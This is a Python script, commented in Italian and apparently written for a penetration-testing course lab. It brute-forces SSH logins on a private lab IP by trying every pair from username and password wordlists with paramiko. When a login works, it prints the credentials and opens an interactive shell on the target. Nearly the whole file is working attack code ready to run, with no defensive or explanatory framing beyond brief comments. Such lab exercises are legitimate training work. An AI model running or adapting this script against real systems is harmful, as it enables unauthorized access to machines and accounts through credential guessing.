import paramiko, sys, select, tty, termios, logging

# Disabilita i log di debug di paramiko per un output pulito
logging.getLogger("paramiko").setLevel(logging.WARNING)

# CONFIGURAZIONE TARGET
TARGET_IP = "192.168.50.101"
SSH_PORT = 22
USER_FILE = "usernames.txt"
PASS_FILE = "passwords.txt"

# 1. Lettura dei dizionari su Kali
try:
    with open(USER_FILE, "r") as uf, open(PASS_FILE, "r") as pf:
        user_list = [u.strip() for u in uf.readlines() if u.strip()]
        pwd_list = [p.strip() for p in pf.readlines() if p.strip()]
except FileNotFoundError:
    print(f"[!] Errore: File '{USER_FILE}' o '{PASS_FILE}' non trovati nella cartella corrente.")
    sys.exit(1)

print(f"[*] Avvio attacco Brute-Force su {TARGET_IP}...")
print(f"[*] Righe caricate dal dizionario -> Utenti: {len(user_list)} | Password: {len(pwd_list)}")
print(f"[*] Combinazioni totali da testare: {len(user_list) * len(pwd_list)}\n")

# 2. Ciclo di attacco automatizzato
for user in user_list:
    for pwd in pwd_list:
        print(f"[*] Test in corso: {user} -> {pwd}")
        
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            # Connessione con gestione automatica della crittografia legacy
            ssh.connect(hostname=TARGET_IP, port=SSH_PORT, username=user, password=pwd, timeout=5)
            
            print("\n" + "="*50)
            print(f"[+] CREDENZIALI IDENTIFICATE: {user} -> {pwd}")
            print(f"[+] APERTURA SHELL INTERATTIVA DIRETTA...")
            print("="*50 + "\n")
            
            # 3. Attivazione sessione interattiva (Come mostrato dal docente)
            chan = ssh.invoke_shell()
            old_tty = termios.tcgetattr(sys.stdin)
            try:
                tty.setraw(sys.stdin.fileno())
                chan.setblocking(0)

                while True:
                    r, w, e = select.select([chan, sys.stdin], [], [])
                    if chan in r:
                        try:
                            x = chan.recv(1024).decode('utf-8', errors='ignore')
                            if len(x) == 0:
                                break
                            sys.stdout.write(x)
                            sys.stdout.flush()
                        except:
                            pass
                    if sys.stdin in r:
                        x = sys.stdin.read(1)
                        if len(x) == 0:
                            break
                        chan.send(x)
            finally:
                termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
            
            chan.close()
            ssh.close()
            sys.exit(0)
            
        except paramiko.AuthenticationException:
            # La credenziale è errata: chiude il socket e passa alla successiva senza mostrare errori
            ssh.close()
        except Exception as errore_imprevisto:
            # Se c'è un errore di rete o di algoritmo ce lo mostra a schermo
            print(f"[!] Problema di connessione con la macchina: {errore_imprevisto}")
            ssh.close()

print("\n[-] Scansione completata. Nessuna credenziale valida trovata nell'elenco.")